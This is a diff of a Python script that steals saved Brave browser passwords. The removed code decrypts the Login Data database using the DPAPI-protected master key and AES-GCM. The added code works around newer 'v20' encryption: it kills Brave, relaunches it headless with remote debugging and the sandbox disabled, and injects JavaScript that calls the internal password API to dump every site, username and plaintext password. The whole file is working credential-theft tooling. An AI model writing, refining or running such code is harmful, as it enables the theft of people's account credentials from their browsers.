@@ -1,61 +1,90 @@
-import os
-import json
-import sqlite3
-import shutil
-import base64
-import win32crypt # Part of pywin32
-from Cryptodome.Cipher import AES # Part of pycryptodomex
+import os, subprocess, time, requests, json, websocket
 
-def get_master_key():
-    local_state_path = os.path.join(os.environ['USERPROFILE'], 
-        r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State")
-    with open(local_state_path, "r", encoding="utf-8") as f:
-        local_state = json.load(f)
-    
-    # Extract the key and decode from Base64
-    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-    # Remove DPAPI prefix 'DPAPI' (5 bytes) and decrypt
-    return win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
+# Using the path you confirmed from Task Manager
+BRAVE_PATH = r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"
+USER_DATA_DIR = os.path.join(os.environ['LOCALAPPDATA'], r"BraveSoftware\Brave-Browser\User Data")
 
-def decrypt_password(buff, master_key):
+def get_brave_passwords_plaintext():
+    print("[*] Launching v20 Password Decryption Bypass...")
+    # Kill any existing Brave processes to unlock the database
+    os.system("taskkill /F /IM brave.exe /T >nul 2>&1")
+    time.sleep(2)
+
+    # Launching with specific flags to allow the internal API to talk to us
+    cmd = (
+        f'"{BRAVE_PATH}" '
+        f'--remote-debugging-port=9222 '
+        f'--user-data-dir="{USER_DATA_DIR}" '
+        f'--remote-allow-origins=* '
+        f'--headless '
+        f'--no-sandbox '
+        f'--disable-extensions'
+    )
+    subprocess.Popen(cmd, shell=True)
+    time.sleep(8) 
+
     try:
-        # Modern Brave passwords start with 'v10' or 'v11' (3 bytes)
-        # The next 12 bytes are the IV (Initialization Vector)
-        iv = buff[3:15] 
-        payload = buff[15:]
-        
-        # In newer versions, the last 16 bytes of the payload are the 'Auth Tag'
-        ciphertext = payload[:-16]
-        tag = payload[-16:]
-        
-        cipher = AES.new(master_key, AES.MODE_GCM, iv)
-        decrypted_pass = cipher.decrypt_and_verify(ciphertext, tag)
-        return decrypted_pass.decode()
-    except Exception as e:
-        return f"Decryption Failed: {str(e)}"
+        response = requests.get("http://localhost:9222/json")
+        ws_url = response.json()[0]['webSocketDebuggerUrl']
+        ws = websocket.create_connection(ws_url)
 
-def extract_brave_passwords():
-    db_path = os.path.join(os.environ['USERPROFILE'], 
-        r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data")
-    shutil.copy2(db_path, "temp_login_data.db") # Forensic copy [cite: 73]
-    
-    master_key = get_master_key()
-    conn = sqlite3.connect("temp_login_data.db")
-    cursor = conn.cursor()
-    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-    
-    print(f"\n{'SITE':<40} | {'USERNAME':<20} | {'PASSWORD'}")
-    print("-" * 80)
-    
-    # Replace your loop with this to see the "Signature" of the encryption
-    for url, user, enc_pass in cursor.fetchall():
-        if user:
-            # Check the first 3 bytes to see the version (v10, v11, v20?)
-            version_tag = enc_pass[:3].decode(errors='ignore')
-            print(f"Site: {url} | Version Tag: {version_tag} | Blob Length: {len(enc_pass)}")
+        # Step 1: Navigate to the password manager page
+        ws.send(json.dumps({"id": 1, "method": "Page.navigate", "params": {"url": "chrome://password-manager/passwords"}}))
+        time.sleep(5) 
+
+        # Step 2: Inject JS to scrape the list
+        # We target 'urls.shown', 'username', and the decrypted 'password'
+        js_code = """
+        new Promise((resolve) => {
+            chrome.passwordsPrivate.getSavedPasswordList((list) => {
+                resolve(list);
+            });
+        });
+        """
         
-            password = decrypt_password(enc_pass, master_key)
-            print(f"Result: {password}\n")
+        print("[*] Injecting Scraper into signed browser context...")
+        ws.send(json.dumps({
+            "id": 2, 
+            "method": "Runtime.evaluate", 
+            "params": {"expression": js_code, "awaitPromise": True, "returnByValue": True}
+        }))
+        
+        # Loop until we get the result for ID 2
+        while True:
+            res = json.loads(ws.recv())
+            if res.get("id") == 2:
+                # This is the list of password objects
+                pass_list = res.get('result', {}).get('result', {}).get('value', [])
+                break
+        
+        ws.close()
+        return pass_list
+
+    except Exception as e:
+        print(f"[-] Bypass failed: {e}")
+        return []
 
 if __name__ == "__main__":
-    extract_brave_passwords()
+    passwords = get_brave_passwords_plaintext()
+    
+    if passwords:
+        print(f"\n{'SITE':<40} | {'USERNAME':<20} | {'PASSWORD'}")
+        print("-" * 80)
+        for entry in passwords:
+            # Inside the Brave API, the site is often in 'urls.shown'
+            site = entry.get('urls', {}).get('shown', 'Unknown Site')
+            user = entry.get('username', 'Unknown User')
+            
+            # The browser might return 'password' as an empty string if 
+            # Windows Security (PIN) is triggered. 
+            password = entry.get('password', '')
+            
+            if not password:
+                password = "[PROTECTED BY WINDOWS HELLO]"
+
+            print(f"{site:<40} | {user:<20} | {password}")
+    else:
+        print("[-] No passwords found or extraction blocked.")
+    
+    # Cleanup
+    os.system("taskkill /F /IM brave.exe /T >nul 2>&1")
